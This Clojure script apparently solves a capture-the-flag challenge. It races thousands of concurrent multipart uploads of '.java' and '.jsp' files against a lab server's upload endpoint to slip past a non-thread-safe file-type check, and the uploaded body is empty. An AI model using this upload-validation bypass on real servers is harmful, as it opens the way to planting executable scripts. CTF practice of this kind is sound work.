(ns script.upload
  (:require
    [clojure.string :as str]
    [clojure.tools.logging :as log]
    [aleph.http :as http]
    [manifold.deferred :as d]
    [io.github.sokrato.ctf.threads :as t])
  (:gen-class))

(def ret (volatile! nil))

(defn upload [filetype]
  @(d/chain
     (http/post
       "http://10.0.79.173:8012/upload"
       {:headers {"Content-Type" "multipart/form-data; boundary=----WebKitFormBoundary1VRggbIMvkOI9Hhd"}
        :as      :json
        :body    (str
                   "------WebKitFormBoundary1VRggbIMvkOI9Hhd\r\n"
                   (format "Content-Disposition: form-data; name=\"file\"; filename=\"f.%s\"\r\n" filetype)
                   "Content-Type: application/octet-stream\r\n\r\n \r\n"
                   "------WebKitFormBoundary1VRggbIMvkOI9Hhd--\r\n")})
     :body
     :msg))

(defn f1 [_]
  (upload "java")
  @ret)

(defn f2 [_]
  (let [msg (upload "jsp")]
    (when-not (str/starts-with? msg "文件类型不合法")
      (log/info "CTF!" msg)
      (vreset! ret ::t/done))
    @ret))

;; 非并发安全的代码
(defn crack-nts []
  (let [wg1 (t/workgroup f1)
        wg2 (t/workgroup f2 2)]
    (t/add-all wg1 (range 1000000))
    (t/add-all wg2 (range 100000))))
